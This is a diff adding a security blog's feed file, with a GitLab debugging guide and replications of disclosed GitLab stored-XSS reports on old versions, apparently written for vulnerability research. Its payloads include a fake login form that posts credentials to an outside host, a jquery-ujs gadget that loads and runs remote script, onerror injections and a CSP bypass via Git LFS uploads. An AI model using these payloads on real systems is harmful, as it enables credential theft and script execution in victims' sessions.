@@ -1,0 +1,2502 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-21T11:31:19+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Gitlab debugging: Using gitlab official docker to debug rails backend</title><link href="http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug.html" rel="alternate" type="text/html" title="Gitlab debugging: Using gitlab official docker to debug rails backend" /><published>2023-12-30T10:31:06+08:00</published><updated>2023-12-30T10:31:06+08:00</updated><id>http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug</id><content type="html" xml:base="http://localhost:4000/debug/2023/12/30/using-gitlab-docker-to-debug.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Using gitlab official docker to debug rails backend</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">ps aux</code> 查看 gitlab 各种进程</p>
+
+    <p><img src="/assets/gitlab/1/gitlabps.png" alt="gitlabps" /></p>
+  </li>
+  <li>
+    <p>gitlab docker 的安装路径：<code class="language-plaintext highlighter-rouge">/opt/gitlab</code></p>
+  </li>
+  <li>
+    <p>启动脚本：<code class="language-plaintext highlighter-rouge">/opt/gitlab/bin</code></p>
+  </li>
+  <li>
+    <p>gitlab rails 目录：<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails</code></p>
+  </li>
+  <li>
+    <p>gitlab rails 启动命令：<code class="language-plaintext highlighter-rouge">/opt/gitlab/bin/gitlab-rails</code>
+<code class="language-plaintext highlighter-rouge">exec /opt/gitlab/embedded/bin/chpst -e /opt/gitlab/etc/gitlab-rails/env ${privilege_drop} -U ${gitlab_user}:${gitlab_group} /opt/gitlab/embedded/bin/bundle exec rails "$@"</code></p>
+  </li>
+  <li>
+    <p>Docker gitlab 查看服务: <code class="language-plaintext highlighter-rouge">gitlab-ctl status</code></p>
+  </li>
+</ol>
+
+<h2 id="steps">Steps</h2>
+
+<ol>
+  <li>
+    <p>停止 <code class="language-plaintext highlighter-rouge">unicorn</code> 服务，该服务负责运行 rails，后续我们手动启动：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-ctl stop unicorn
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>端口占用：3000 被 grafana 占用，后续 rails 将启动在 3000 端口，需要将 grafana 停止：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gitlab-ctl stop grafana
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>手动启动 rails</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /opt/gitlab/bin &amp;&amp; ./gitlab-rails server
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>修改 nginx 配置文件：<code class="language-plaintext highlighter-rouge">/var/opt/gitlab/nginx/conf/gitlab-http.conf</code> 。由于前端是编译好的，因此资源和 js 路径不再由 yarn 提供，而且由 nginx 提供，资源文件的重定向不变，但是位置需要提前。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location /assets {
+ proxy_cache gitlab;
+ proxy_pass  http://gitlab-workhorse;
+}
+</code></pre></div>    </div>
+
+    <p>其他所有流量重定向为 puma 开启的本地端口 3000</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location / {
+   proxy_pass http://localhost:3000/;
+   proxy_cache off;
+}
+</code></pre></div>    </div>
+
+    <p>修改后重启 nginx：<code class="language-plaintext highlighter-rouge">gitlab-ctl restart nginx</code></p>
+  </li>
+  <li>
+    <p>添加 ruby 的 include 文件夹，将 ruby 变为开发版本，否则无法安装 gem，gem 需要 native 依赖。编译相同版本的 ruby，将编译后的 include 文件夹拷贝到路径：<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/</code></p>
+  </li>
+  <li>
+    <p>进入 rails 目录<code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails</code>，修改 Gemfile，添加 pry-byebug 库到主环境中，不加的话会报找不到 pry，例如</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gem 'pry-byebug', '~&gt; 3.5.1'
+</code></pre></div>    </div>
+
+    <p>同 development 环境的 version 一致</p>
+  </li>
+  <li>
+    <p>然后在应用 root 目录执行 <code class="language-plaintext highlighter-rouge">bundle install</code>，自动安装 <code class="language-plaintext highlighter-rouge">pry-byebug</code></p>
+  </li>
+  <li>
+    <p>在 break point 处下断点指令 <code class="language-plaintext highlighter-rouge">binding.pry</code></p>
+  </li>
+  <li>
+    <p>启动后端，由 puma 启动，默认端口 3000：</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gitlab-rails server -e development -b 0.0.0.0
+</code></pre></div>    </div>
+    <p>程序运行到断点会在当前终端停下</p>
+  </li>
+</ol>]]></content><author><name></name></author><category term="debug" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</title><link href="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html" rel="alternate" type="text/html" title="Replication: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages" /><published>2023-12-25T10:31:06+08:00</published><updated>2023-12-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<blockquote>
+  <p>Ubuntu 18.04
+gitlab 12.3.5</p>
+</blockquote>
+
+<blockquote>
+  <p>原文：<a href="https://hackerone.com/reports/662287">https://hackerone.com/reports/662287</a></p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+
+<h2 id="summary">Summary</h2>
+
+<p>该漏洞存在于用 md 构建 wikipage 这一过程，由于后端没有对 rdoc(和 markdown 很像，ruby 文档生成器)进行严格处理，导致用户能够注入大量 html 代码，这个漏洞太经典了，后续很多漏洞都是以此为基础而利用。</p>
+
+<p><img src="/assets/gitlab/1/rdoc.png" alt="rdoc" /></p>
+
+<p>报告过程</p>
+
+<ol>
+  <li>2019 年 7 月 28 日，首先找到 rdoc 渲染问题，用户能够将 image 嵌入到 a 标签中，并且能够注入 class 属性。</li>
+  <li>注入的 class 属性利用了原应用的类，将 a 标签 z-index 置顶，诱导用户点击。</li>
+  <li>用户甚至能够注入 html 代码，构造钓鱼弹框。但是还没涉及到 xss。（以上是 ruby 后端渲染漏洞）</li>
+  <li>攻击者发现可以注入特定类的 html 代码，拼接前端的 jquery 代码，实现 xss 注入。该处还未实现 csp 绕过。</li>
+  <li>2 个月后，2019 年 10 月 13 日，该漏洞还未修复。并且 gitlab 引用了新的漏洞代码 jquery-ujs，利用 data-method 属性，实现 csp 绕过。（以上是前端漏洞）</li>
+  <li>总结下来，该漏洞分为三部分，第一部分是 html 注入，第二部分是 xss 注入，第三部分是 csp 绕过。</li>
+  <li>因此，复现以最新版本进行，2019 年 10 月 13 日发布的 gitlab12.3.5。</li>
+</ol>
+
+<p>要点：</p>
+
+<ol>
+  <li>class 注入，改变元素外观，从而触发点击</li>
+  <li>a 标签包围 img 标签，img 设置为无限大，触发点击</li>
+  <li>jquery-ujs 的 data-method
+jquery-ujs 提供了一些额外的特性，如将 data-remote 属性应用到链接和表单上，然后使用 AJAX 请求提交数据，或者利用 data-confirm 属性显示确认对话框。</li>
+</ol>
+
+<h3 id="backend-rails">backend, rails</h3>
+
+<p>payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a form
+{
+&lt;div class="modal show d-block"&gt;
+&lt;div class="modal-dialog"&gt;
+&lt;div class="modal-content"&gt;
+&lt;div class="modal-header"&gt;
+&lt;h3 class="page-title"&gt;Please Log In&lt;/h3&gt;
+&lt;/div&gt;
+&lt;div class="modal-body"&gt;
+&lt;form class="new-wiki-page" action="http://aw.rs/"&gt;
+&lt;div class="form-group"&gt;
+&lt;label for="username"&gt;&lt;span&gt;Username&lt;/span&gt;&lt;/label&gt;
+&lt;input type="text" name="username" id="username" class="form-control"&gt;
+&lt;label for="password"&gt;&lt;span&gt;Password&lt;/span&gt;&lt;/label&gt;
+&lt;input type="password" name="password" id="password" class="form-control"&gt;
+&lt;/div&gt;
+&lt;div class="form-actions"&gt;&lt;button name="button" type="submit" class="btn btn-success"&gt;Login&lt;/button&gt;&lt;/div&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+}[/]
+</code></pre></div></div>
+
+<p>可以看到能够注入 <code class="language-plaintext highlighter-rouge">div、h3、form、label、input</code> 等标签，以及 <code class="language-plaintext highlighter-rouge">class、action、id、type</code> 等属性。 后端渲染时可以注入部分标签、class 和部分属性，但是 data 属性无法注入，应该是后端做了过滤。因此才会利用前端 gadget 来注入新的包含 <code class="language-plaintext highlighter-rouge">data-*</code>属性的 a 标签，因此该攻击的本质是，首先通过后端注入有限的 html，然后再通过前端 gadget 来注入无限的 html。
+提交该数据的 url 为 post 方法：<em>http://10.206.44.19:8033/root/xss/wikis</em></p>
+
+<h3 id="frontend-jquery-gadgets">frontend, jquery gadgets</h3>
+
+<p>需要点击触发 jquery-ujs 的 data-method 方法，也就是说只要网站支持 jqeury-ujs，并且能够注入 a 标签及其属性，那么 xss 必然出现</p>
+
+<p>payload1:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+&lt;form class="gl-show-field-errors"&gt;
+&lt;input type="text" title="&amp;#x3C;/p&amp;#x3E;&amp;#x3C;a data-remote=&amp;#x22;true&amp;#x22; data-confirm=&amp;#x22;Are you sure&amp;#x22; data-method=&amp;#x22;get&amp;#x22; data-type=&amp;#x22;script&amp;#x22; href=&amp;#x22;https://gitlab.com/vakzz-h1/public/-/raw/master/test.js&amp;#x22; class=&amp;#x27;atwho-view select2-drop-mask pika-select&amp;#x27;&amp;#x3E;&amp;#x3C;img height=10000 width=10000&amp;#x3E;&amp;#x3C;/a&amp;#x3E;"&gt;
+}[#]
+</code></pre></div></div>
+
+<p>后端渲染结果：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form class="xxx"&gt;&lt;input type="" title="xxx"&gt;
+</code></pre></div></div>
+
+<p>前端渲染后：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form&gt;&lt;a data-method='get'&gt;&lt;img&gt;&lt;/a&gt;&lt;/form&gt;
+</code></pre></div></div>
+
+<p>经过测试 jquery-ujs 会直接执行 script，如下面代码片段，在最新版本上测试可以 xss：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ujs/1.2.3/rails.js"&gt;&lt;/script&gt;
+&lt;a data-remote="true" data-confirm="Are you sure" data-method="get" data-type="script"
+        href="https://gitlab.com/vakzz-h1/public/-/raw/master/test.js"&gt;
+        jquery-ujs xss test
+&lt;/a&gt;
+</code></pre></div></div>
+
+<p>其中 data-type 对应 ajax 的 type 字段，参考</p>
+
+<ul>
+  <li><a href="https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type">https://github.com/rails/jquery-ujs/wiki/Unobtrusive-scripting-support-for-jQuery-%28list-of-data-attributes%29#data-type</a></li>
+  <li><a href="https://api.jquery.com/jQuery.ajax/">https://api.jquery.com/jQuery.ajax/</a></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dataType (default: Intelligent Guess (xml, json, script, or html))
+"script": Evaluates the response as JavaScript and returns it as plain text. Disables caching by appending a query string parameter, _=[TIMESTAMP], to the URL unless the cache option is set to true. Note: This will turn POSTs into GETs for remote-domain requests. an XML MIME type will yield XML, in 1.4 JSON will yield a JavaScript object, in 1.4 script will execute the script, and anything else will be returned as a string
+</code></pre></div></div>
+
+<p>例如在 chrome-tools control+p 搜索：jquery-ujs 关键字，看目标网站是否有该库</p>
+
+<p><img src="/assets/gitlab/1/ujs.png" alt="ujs" /></p>
+
+<p>payload2:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+&lt;form class="gl-show-field-errors"&gt;
+&lt;input type="text" title="&lt;script&gt;alert(11)&lt;/script&gt;"&gt;
+}[#]
+</code></pre></div></div>
+
+<p>从下一个复现漏洞中得知利用前端 jquery 片段的漏洞，由于该漏洞需要在页面初始化时才会调用，而本次复现，后端渲染的漏洞代码直接通过路由页面返回。因此 main.js 得以执行触发该漏洞。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Stored XSS in markdown when redacting references</title><link href="http://localhost:4000/xss/2023/12/05/store-xss-in-markdown.html" rel="alternate" type="text/html" title="Replication: Gitlab Stored XSS in markdown when redacting references" /><published>2023-12-05T10:31:06+08:00</published><updated>2023-12-05T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/05/store-xss-in-markdown</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/05/store-xss-in-markdown.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Gitlab Stored XSS in markdown when redacting references</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<blockquote>
+  <p>Gdk version:
+1b0e37a87f64ea5aad3ec9af1de9d563ca2a6a44
+Gitlab version
+v12.9.2-ee
+Ubuntu version
+18.04</p>
+</blockquote>
+
+<blockquote>
+  <p>原文：<a href="https://hackerone.com/reports/836649">https://hackerone.com/reports/836649</a></p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+
+<h2 id="summary">Summary</h2>
+
+<p>漏洞函数<code class="language-plaintext highlighter-rouge">redacted_node_content</code>负责渲染 markdown 的 reference 部分，其中 node 的<code class="language-plaintext highlighter-rouge">data-original</code>属性能够被注入 xss，导致<code class="language-plaintext highlighter-rouge">#{content}</code>包含该 xss 返回前端得到执行。
+<em>lib/banzai/reference_redactor.rb:75</em></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def redacted_node_content(node)
+      original_content = node.attr('data-original')
+      link_reference = node.attr('data-link-reference')
+      # Build the raw &lt;a&gt; tag just with a link as href and content if
+      # it's originally a link pattern. We shouldn't return a plain text href.
+      original_link =
+        if link_reference == 'true'
+          href = node.attr('href')
+          content = original_content
+          %(&lt;a href="#{href}"&gt;#{content}&lt;/a&gt;)
+        end
+</code></pre></div></div>
+
+<h2 id="code-review">Code Review</h2>
+
+<h3 id="pre-byebug">pre-byebug</h3>
+
+<p>由于 ruby 版本比较老旧，无法使用 vscode 插件进行调试，选择 pre-byebug 手动调试。首先在代码行前插入 pre-byebug 断点 binding.pry，然后使用<code class="language-plaintext highlighter-rouge">bin/rails server</code>跑起来，遇到断点则自动停下。
+尝试关闭 log 开启调试，<code class="language-plaintext highlighter-rouge">rails server --help</code>知道，加上后缀可以关闭 log
+<code class="language-plaintext highlighter-rouge">bin/rails server --no-log-to-stdout</code>
+另外还有 puma 的日志需要关闭：
+<em>lib/gitlab/cluster/puma_worker_killer_initializer.rb:33</em> 添加：（见<a href="https://github.com/zombocom/puma_worker_killer">https://github.com/zombocom/puma_worker_killer</a>）
+<code class="language-plaintext highlighter-rouge">config.reaper_status_logs = false</code></p>
+
+<ol>
+  <li>通过 drawio 画出<a href="https://drive.google.com/file/d/1RuaQELwDr-kQDS1XHNpDNi8Xh7EQ4WZI/view?usp=sharing">函数流关系图</a>。找到部分触发该漏洞函数的 controller。</li>
+</ol>
+
+<h3 id="review">Review</h3>
+
+<ol>
+  <li>直接通过 markdown preview 渲染来实时获取渲染片段。经过调试发现，用户的输入首先会进行 html 化，然后进行渲染。
+<em>app/controllers/concerns/preview_markdown.rb</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>render json: {
+      body: view_context.markdown(result[:text], markdown_context_params),
+      references: {
+        users: result[:users],
+        suggestions: SuggestionSerializer.new.represent_diff(result[:suggestions]),
+        commands: view_context.markdown(result[:commands])
+      }
+    }
+</code></pre></div>    </div>
+    <p><em>app/helpers/markup_helper.rb:99</em></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def markdown(text, context = {})
+    return '' unless text.present?
+    context[:project] ||= @project
+    context[:group] ||= @group
+    html = markdown_unsafe(text, context)
+    # byebug
+    prepare_for_rendering(html, context)
+  end
+</code></pre></div>    </div>
+    <p>从 preview 的调用栈，可以看到首先将 markdown 转为 html，然后再对 html 进行处理。<code class="language-plaintext highlighter-rouge">markdown_unsafe</code>主要负责前中期 html 转换，<code class="language-plaintext highlighter-rouge">prepare_for_rendering</code>负责 html 的后期处理，当然问题出在这个后期处理上。</p>
+  </li>
+  <li>通过函数名推断，输入 reference 相关 markdown，可以触发漏洞函数，查询文档可以得知 reference 的 markdown 语法。<a href="https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references">https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references</a>。（ps:分析项目还是要结合文档进行分析，不然什么时候才时候头呢？）</li>
+  <li>例如输入<code class="language-plaintext highlighter-rouge">@root</code>，这是一个用户引用 markdown，会引用 root 这个用户，那么第一个函数<code class="language-plaintext highlighter-rouge">markdown_unsafe</code>会返回 html:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p data-sourcepos="1:1-1:5" dir="auto"&gt;
+&lt;a href="/root" data-user="1" data-reference-type="user" data-container="body" data-placement="top" data-html="true" class="gfm gfm-project_member" title="Administrator"&gt;
+@root&lt;/a&gt;
+&lt;/p&gt;
+</code></pre></div>    </div>
+    <p>但是从漏洞函数分析，html 需要包含属性<code class="language-plaintext highlighter-rouge">data-origin</code>和<code class="language-plaintext highlighter-rouge">data-reference-link</code>这个两个值才行，特别是<code class="language-plaintext highlighter-rouge">data-reference-link</code>是必须的。</p>
+  </li>
+  <li>从文字着手分析，应该是包含链接的 reference，从文档查看，应该是：<code class="language-plaintext highlighter-rouge">[README](doc/README.md#L13)</code></li>
+  <li>经过代码审计，发现 gitlab 特定的 markdown 有两种输入方式，分别是 markdown 和 html 格式，html 由 markdown 渲染而来，因此用户输入该 html 也能达到同等渲染效果，但是 html 的输入扩大了攻击面。
+<em>gitlab-v12.9.2-ee/lib/banzai/pipeline/gfm_pipeline.rb</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># These filters transform GitLab Flavored Markdown (GFM) to HTML.
+# The nodes and marks referenced in app/assets/javascripts/behaviors/markdown/editor_extensions.js
+# consequently transform that same HTML to GFM to be copied to the clipboard.
+# Every filter that generates HTML from GFM should have a node or mark in
+# app/assets/javascripts/behaviors/markdown/editor_extensions.js.
+# The GFM-to-HTML-to-GFM cycle is tested in spec/features/copy_as_gfm_spec.rb.
+</code></pre></div>    </div>
+    <p>因此直接对 markdown 渲染后的元素进行拷贝作为基准 payload，下面拷贝了引用 issue 的 markdown<code class="language-plaintext highlighter-rouge">#1</code>所渲染的 html:</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="http://127.0.0.1:3000/xss/xxss/-/issues/1" data-original="#1" data-link="false" data-link-reference="false" data-project="20" data-issue="436" data-reference-type="issue" data-container="body" data-placement="top" data-html="true" title="xss"&gt;#1&amp;lt;img src=x&amp;gt;&lt;/a&gt;
+</code></pre></div>    </div>
+    <p>payload 中<code class="language-plaintext highlighter-rouge">#1&amp;lt;img src=x&amp;gt;</code>是主要部分。该部分原本是 escape 后的字符串，但是在后端处理时将其赋值给了属性值，而 Nokogiri 库自动对属性值进行 unescape。</p>
+  </li>
+  <li>ruby 库 Nokogiri 解析 html 字符串时，会把属性中 html encoded 字符进行 unencoded，最终造成注入问题。
+<em>lib/banzai/filter/reference_filter.rb:132</em> 该函数将 html 字符串替换到 node 对象中，其中 html 字符串包含 escape 的属性值。
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def replace_link_node_with_href(node, link)
+    html = yield
+    binding.pry
+    node.replace(html) unless html == link
+end
+</code></pre></div>    </div>
+    <p>node.replace 是 nokogiri 库调用，该函数对 html 字符串进行解析，构建 html node 对象:
+<em>/home/kali/.rvm/gems/ruby-2.6.5/gems/nokogiri-1.10.8/lib/nokogiri/xml/node.rb:477</em></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node_set = in_context(contents, options.to_i)
+</code></pre></div>    </div>
+    <p>其中解析字符串的函数由 nokogiri 的<a href="https://github.com/sparklemotion/nokogiri/blob/9aebcc669a7028e4faad1fc8b53cf46a2f2320ba/ext/nokogiri/xml_node.c#L2152">c 函数</a>实现。该函数负责解析属性和值，并且将属性值的 html 编码进行 unescape。</p>
+  </li>
+</ol>
+
+<h3 id="step-to-reproduce">Step to reproduce</h3>
+
+<ol>
+  <li>首先新建一个非公开的 issue，然后再新建一个公开 issue</li>
+  <li>在公开的 issue 中引用非公开的 issue 进行评论，并且注入 payload</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>其中2是私密issue，该payload需要发送在issue1中
+&lt;a href="http://127.0.0.1:3000/xss/xxss/-/issues/2" data-original="#2" data-link="false" data-link-reference="false" data-project="20" data-issue="437" data-reference-type="issue" data-container="body" data-placement="top" data-html="true" title="hacked"&gt;#2&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/a&gt;
+</code></pre></div></div>
+
+<ol>
+  <li>用其他账户登录，查看公开 issue，即可完成攻击</li>
+  <li>现在能够注入任意 html 和 xss payload，但是如果有 csp，那么需要绕过，绕过方法可以考虑 jquery：构造一个需要全局初始化的 html 片段，然后由前端进行注入。</li>
+</ol>
+
+<h3 id="csp-bypass">csp bypass</h3>
+
+<ol>
+  <li>当然这些绕过是平时找到的 gadget，需要每天日积月累的审计源代码才能找到。也就是说每天都要 debug，每天都要静态分析，每天都要动态分析才行。这需要理解软件的逻辑，什么是软件的逻辑，包括路由，渲染，功能之类的，这绝对不是做个漏洞复现，切片就足够的。</li>
+  <li>首先选定用 jquery 注入 script 标签的方式，通过 <code class="language-plaintext highlighter-rouge">\$\([</code>’”][\s\S]{0,100}?&lt;[\s\S]{3,200}?&gt;[\s\S]{0,100}?[<code class="language-plaintext highlighter-rouge">'"]\)</code> 来定位到。
+<em>app/assets/javascripts/gl_field_error.js</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this.fieldErrorElement = $(`&lt;p class='${errorMessageClass} hidden'&gt;${this.errorMessage}&lt;/p&gt;`);
+</code></pre></div>    </div>
+  </li>
+  <li>逆向分析得知，该函数由 main.js 调用，也就是所谓的全局初始化代码
+<em>app/assets/javascripts/gl_field_errors.js</em>
+<em>app/assets/javascripts/main.js:337</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$('.gl-show-field-errors ').each((i, form) =&gt; new GlFieldErrors(form));
+</code></pre></div>    </div>
+  </li>
+  <li>该段代码显示，只要注入 class 为 gl-show-field-errors 的片段，就能够被执行，那么构造 payload 如下：
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input class="gl-show-field-errors gl-field-error-ignore" type=url title="&lt;script&gt;alert(11)&lt;/script&gt;"/&gt;
+html encode:
+&amp;lt;input class=&amp;quot;gl-show-field-errors gl-field-error-ignore&amp;quot; type=url title=&amp;quot;&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;&amp;quot;/&amp;gt;
+</code></pre></div>    </div>
+    <p><img src="/assets/gitlab/1/referencexss.png" alt="referencexss" /></p>
+  </li>
+  <li>虽然成功注入了，但是没有触发，原因是注入的 html 代码是动态渲染的，而初始化前端在动态渲染之前就已执行完毕。</li>
+  <li>看了作者的绕过方法，提供了两种绕过方法，其中一种是直接注入 script src 标签，并且 src 指向本域名的 js 文件。</li>
+  <li>csp 绕过，通过上传 js 到同域名下，再用 script 标签直接引用该 js，gitlab 提供 git lfs 服务端和客户端来管理用户上传的文件，如果用该客户端上传文件，那么点击该文件的链接就会直接下载，并且域名相同。github 也提供该功能，但是文件被保存到另一个域名中了，但是 gitlab 却依然是同域名。</li>
+  <li>以下为 lfs 的操作命令：
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://gitlab.com/sunriseXu/lfs.git
+git lfs track "*.js"
+vim test.js
+git add . &amp;&amp; git commit -m 'test'
+git push
+git lfs ls-files
+</code></pre></div>    </div>
+  </li>
+  <li>经过测试，发现 github 的查看和下载文件的链接都在 gitlab.com 域名中，但是即使不用 lfs 上传 js，其他文件的下载链接都是在 gitlab.com 域名中，所以 lfs 没有必要吧，经过测试还是有必要，报错如下：
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Refused to execute script from 'https://gitlab.com/1159309551xcz/lfs/-/raw/main/test?ref_type=heads&amp;inline=false' because its MIME type ('application/octet-stream') is not executable, and strict MIME type checking is enabled.
+</code></pre></div>    </div>
+    <p>就是说 script 的链接需要返回的 type 不能是 octet-stream
+上传一个 lfs 的 js 文件，返回的类型是 text/javascript：</p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://gitlab.com/1159309551xcz/lfs/-/raw/main/test.js?ref_type=heads&amp;inline=false
+</code></pre></div>    </div>
+    <p>但是上传非 lfs 的 js 文件，返回的类型是 text/octet-stream 和 text/plain，这两种都无法执行，果然还是要 lfs 上传才行，这是 gitlab 一个潜在漏洞。</p>
+  </li>
+</ol>
+
+<h2 id="tips">Tips</h2>
+
+<ol>
+  <li>从结论上说，该漏洞是底层库漏洞，nokogiri 从字符串创建 html 节点的过程存在漏洞，包括 nokogiri 的多个函数。该过程自动将属性中 html 编码进行反编码。而后续代码如果引用该编码码后的属性值插值到 html 字符串片段中，将引发 xss 注入。</li>
+  <li>漏洞定位应聚焦于 nokogiri 解析 html 字符串的相关函数。例如 replace，parse，new 等函数，太多了，可以说 nokogiri 这种解析机制就是很大的问题。当然即使 unescape 属性值，也需要后续插值才能构建完整攻击流程。因此对于该漏洞点位进行定位太泛泛了。</li>
+  <li>但是也有一些危险操作，例如将 node 的 text 也就是文本内容(通过 inner_html)方法获取，如果是 text，则自动 escape，如果是 node，则返回未编码的 html 字符串。危险的是将这些 inner_html 赋值给属性后转为 html 字符串，再次构建新 node 后，属性值就自动解码了，如果再次利用该属性值将带来危险。所以完成该攻击需要几个函数配合，那就是 nokogiri 的：
+    <ul>
+      <li>inner_html 函数：获取用户输入</li>
+      <li>赋值操作：例如<code class="language-plaintext highlighter-rouge">%Q(data-#{key.to_s.dasherize}="#{escape_once(value)}")</code>，将内容赋值给属性
+replace 等构建</li>
+      <li>node 函数：<code class="language-plaintext highlighter-rouge">node.replace(str)</code>等函数</li>
+      <li>获取属性值的函数 attr：<code class="language-plaintext highlighter-rouge">node.attr(xxx)</code>等函数</li>
+    </ul>
+  </li>
+  <li>引申到 jquery 中：<code class="language-plaintext highlighter-rouge">attr</code>方法将 escape 后的字符串自动 unescape</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Stored XSS via Kroki diagram</title><link href="http://localhost:4000/xss/2023/11/25/csp-bypass-xss-krokixss.html" rel="alternate" type="text/html" title="Replication: Gitlab Stored XSS via Kroki diagram" /><published>2023-11-25T10:31:06+08:00</published><updated>2023-11-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/11/25/csp-bypass-xss-krokixss</id><content type="html" xml:base="http://localhost:4000/xss/2023/11/25/csp-bypass-xss-krokixss.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Stored XSS via Kroki diagram</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<blockquote>
+  <p>gitlab 版本：v15.4.2-ee</p>
+</blockquote>
+
+<blockquote>
+  <p>原文：<a href="https://hackerone.com/reports/1731349">https://hackerone.com/reports/1731349</a></p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+
+<h2 id="summary">Summary</h2>
+
